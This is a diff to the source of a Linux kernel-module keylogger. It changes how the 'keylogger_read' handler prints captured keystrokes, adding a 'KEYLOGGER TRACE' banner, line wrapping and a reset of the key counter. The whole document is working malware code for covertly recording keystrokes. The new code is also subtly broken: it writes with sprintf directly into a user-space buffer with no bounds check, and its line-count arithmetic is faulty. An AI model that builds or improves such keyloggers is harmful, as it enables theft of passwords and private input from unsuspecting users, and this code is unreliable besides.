@@ -35,7 +35,6 @@ int tracker(struct notifier_block *nblock, unsigned long code, void *_param) {
 
             /*
 
-
              THERE IS LEGITIMATELY NO OTHER WAY TO DO THIS.
 
             */
@@ -261,16 +260,24 @@ static int keylogger_release(struct inode *inodep, struct file *filep) {
 static ssize_t keylogger_read(struct file *file, char __user *buffer, size_t count, loff_t *pos) {
 	int i;
 	int length = 0;
+    int linecount = 0;
 
 	if(*pos != 0) { return 0; }	
 
-    length += sprintf(buffer+length, "[");
+    length += sprintf(buffer+length, "\n*** KEYLOGGER TRACE ***\n");
 	for(i = 0; i < LOGGER_LENGTH; i++) {
 
+        if((linecount += i % 20) == 19) {
+            length += sprintf(buffer+length, "\n");
+        } 
         length += sprintf(buffer+length,"%c ", log[i]);
         
     }
-    length += sprintf(buffer+length, "]\n");
+    length += sprintf(buffer+length, "\n***********************\n");
+
+    if(keycount >= LOGGER_LENGTH-1) {
+        keycount = 0;
+    }
 
 	*pos = length;
 
